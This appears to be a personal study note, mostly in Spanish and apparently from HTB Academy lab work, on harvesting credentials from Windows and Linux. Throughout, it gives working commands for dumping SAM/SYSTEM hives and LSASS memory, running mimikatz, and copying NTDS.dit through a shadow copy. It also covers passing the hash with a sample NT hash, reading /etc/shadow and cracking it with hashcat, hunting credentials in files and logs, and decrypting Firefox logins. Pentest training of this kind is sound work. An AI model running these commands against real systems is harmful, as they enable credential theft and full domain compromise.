# Windows
## SAM, SYSTEM Y SECURITY
Primero para sacar los volcados de los Hashes necesitaremos obtener el SAM y el SYSTEM, aunque también es recomendable sacar el SECURITY ya que puede tener alguna credencial en el caché.

Hay varias formas de hacer esto, la mas básica es con permisos de administrador:
```cmd
reg.exe save hklm\sam C:\sam.save

reg.exe save hklm\system C:\system.save

reg.exe save hklm\security C:\security.save
```

Nos movemos estos archivos a nuestra kali y desde allí usaremos [[Secretsdump]]

Una vez que tengamos credenciales podremos obtener los secretos LSA con netexec:
```
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

También podríamos usar netexec para sacar el SAM con --sam
(SIN REQUERIR PERMISOS DE MÁXIMOS)

## LSASS
### Con GUI:
![[Pasted image 20250920195702.png]]
Se crea un archivo llamado `lsass.DMP`y se guarda en `%temp%`

### Con CLI
Primero necesitaremos sacar el ID:
```cmd
tasklist /svc
```
O bien mediante:
```powershell
Get-Process lsass
```

Una vez obtenido el ID hacemos el volcado:
```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump [ID] C:\lsass.dmp full
```
(Esto lo crea en C:\\ en la raíz)

#### Una vez obtenido el lsass.dmp para extraer las credenciales necesitaremos usar pypykatz veámoslo:
```
pypykatz lsa minidump [Archivo].dmp 
```


## CMDKEY
Podemos enumerar credenciales almacenadas para un usuario en concreto con cmdkey:
```
cmdkey /list
```

![[Pasted image 20250921185725.png]]

### Suplantamos la identidad
Como vemos en la imagen de arriba tenemos un credencial interactiva como el usuario mcharles, lo usaremos de la siguiente forma:
```cmd
runas /savecred /user:SRV01\mcharles cmd
```
Esto nos dará una cmd como el usuario mcharles

## MIMIKATZ

#Maquina_victima_Windows 
```cmd
mimikatz.exe

privilege::debug

sekurlsa::credman

vault::cred
```
Otras herramientas interesantes para sacar credenciales son SharpDPAPI LaZagne y DonPAPI

## Credenciales en la bóveda de Windows
La bóveda depende de la versión de Windows, estas son las posibles rutas:
![[Pasted image 20250921193124.png]]

Podemos exportarlas con el siguiente comando:
```cmd
rundll32 keymgr.dll,KRShowKeyMgr
```

## NTDS.dit
#Active_Directory
Para sacar este archivo necesitarnos ser administrador de la máquina local o del dominio

Una vez comprobado los permisos vamos a usar VSS con vssadmin para sacar una instantánea del volumen donde se instalo el AD en la configuración:
```PowerShell
vssadmin CREATE SHADOW /For=C:
```
![[Pasted image 20250921204249.png]]

```PowerShell
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

Y con esto ya tendríamos el NTDS.dit, pero  al igual que con `SAM`, los hashes almacenados en `NTDS.dit`están cifrados con una clave almacenada en `SYSTEM`. Para extraerlos correctamente, es necesario descargar ambos archivos.

Nos movemos el archivo y lo damos con [[Secretsdump]]
```
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

### Otra forma mucho más rápido para hacer esto es con netexec
```
netexec smb 10.129.201.57 -u [USER] -p [PASSWORD] -M ntdsutil
```

Y los rompemos con hashcat como siempre con el -m 1000
Si no lo conseguimos siempre podemos hacer PassTheHass:
```
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

## Credenciales mediante búsqueda de strings y navegando por directorios

Palabras interesantes y comunes para buscar:
- Passwords
- Passphrases
- Keys
- Username
- User account
- Creds
- Users
- Passkeys
- configuration
- dbcredential
- dbpassword
- pwd
- Login
- Credentials

Vamos a buscar con el siguiente comando:
```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```
O
```powershell
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```

Here are some other places we should keep in mind when credential hunting:

- Passwords in Group Policy in the SYSVOL share
- Passwords in scripts in the SYSVOL share
- Password in scripts on IT shares
- Passwords in `web.config` files on dev machines and IT shares
- Password in `unattend.xml`
- Passwords in the AD user or computer description fields
- KeePass databases (if we are able to guess or crack the master password)
- Found on user systems and shares
- Files with names like `pass.txt`, `passwords.docx`, `passwords.xlsx` found on user systems, shares, and [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration)
## Herramientas automáticas para búsqueda de crendeciales
-Lazagne
-Eviltree
-SessionGopher
-PowerHunt
-neteexec


# Linux
## Biblioteca PAM
La biblioteca PAM donde se almacenan las contraseñas que se han ido modificando a lo largo del tiempo para cada usuario, necesitaremos permisos de administrador:
```
sudo cat /etc/security/opasswd
```
## Unshadow the Shadow
Para poder descifrar contraseñas almacenadas en el shadow podemos hacerlo con la funcion unshadow de John The Ripper:
```s
sudo cp /etc/passwd /tmp/passwd.bak 

sudo cp /etc/shadow /tmp/shadow.bak 

unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

Una vez hecho el unshadow le tiramos con hashcat:
```
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

## Credenciales mediante búsqueda de strings y navegando por directorios

Podemos mirar en:
- `Files` including configs, databases, notes, scripts, source code, cronjobs, and SSH keys
- `History` including logs, and command-line history
- `Memory` including cache, and in-memory processing
- `Key-rings` such as browser stored credentials
- Tres extensiones clave: `.config`, `.conf`, `.cnf`

Una herramienta muy buena para esto es [[EvilTree]]

### Por archivos de configuración
```
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
### Por palabras clave
```
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```
### Por bases de datos
```
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```
### Por notas
```
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```
### Por scripts
```
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```
### Por Cronjobs
```
cat /etc/crontab 
```
### Por historial
```
/home/*/.bash*
```
### Por Logs
```
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```
### Por caché 
Para ello podemos hacer uso de herramientas automatizadas como:
```
sudo python3 mimipenguin.py
```

```
export PYTHONPATH="$PWD:$PYTHONPATH"

python3 laZagne.py all

python2.7 laZagne.py all
```
Y sí no esta mal, hay una versión en python para linux, tendremos que poner los requierements.txt en un venv para que funcione
### Credenciales en Buscadores
```
ls -l .mozilla/firefox/ | grep default
```
Ejemplo:
```
ls -l .mozilla/firefox/ | grep default 

drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
```

```
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```
Pero estarán encriptadas, para sacarlas sin encriptar:
```
python3.9 firefox_decrypt.py
```

## Herramientas automáticas para búsqueda de crendeciales
-Lazagne
-Eviltree
-manspider
-neteexec 

